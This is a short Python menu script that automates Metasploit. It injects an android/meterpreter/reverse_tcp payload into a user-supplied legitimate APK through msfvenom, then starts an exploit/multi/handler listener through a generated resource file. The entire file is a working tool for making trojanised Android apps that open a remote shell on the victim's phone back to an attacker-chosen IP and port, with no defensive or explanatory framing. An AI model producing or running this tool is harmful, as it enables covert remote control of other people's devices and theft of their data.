import os
import subprocess

# Global variables to store LHOST and LPORT
lhost = None
lport = None

def generate_payload():
    global lhost, lport
    lhost = input("Enter payload IP (LHOST): ")
    lport = input("Enter payload port (LPORT): ")
    original_apk = input("Enter original APK path and name (with .apk): ")
    output_apk = input("Enter output APK path and name (with .apk): ")

    if lhost and lport:
        print(f"Your host: {lhost}")
        print(f"Your port: {lport}")
        os.system(f"msfvenom -x {original_apk} -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {output_apk}")
        print(f"Injected payload into {original_apk} and saved as {output_apk}")
    else:
        print("Please set LHOST and LPORT correctly.")

def run_listener():
    global lhost, lport

    if not lhost or not lport:
        print("LHOST and LPORT are not set. Please run option 1 to set them first.")
        return

    # Metasploit commands
    commands = f"""
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
exploit
"""

    script_path = "/tmp/msf_commands.rc"
    with open(script_path, "w") as script_file:
        script_file.write(commands)

    try:
        subprocess.run(
            ["x-terminal-emulator", "-e", f"msfconsole -r {script_path}"],
            check=True
        )
        print("Commands executed. Opened msfconsole in a new terminal.")
    except FileNotFoundError:
        print("Could not find a terminal emulator. Install one or use 'gnome-terminal'.")
    except subprocess.CalledProcessError as e:
        print(f"Error while running msfconsole: {e}")

def main():
    while True:
        print("\nMenu:")
        print("1. Generate Payload APK and Merge With anther APK ")
        print("2. Run Listener")
        print("3. Exit")
        choice = input("Choose an option (1, 2, or 3): ")

        if choice == "1":
            generate_payload()
        elif choice == "2":
            run_listener()
        elif choice == "3":
            print("Exiting program. Goodbye!")
            break
        else:
            print("Invalid choice. Please select 1, 2, or 3.")

if __name__ == "__main__":
    main()
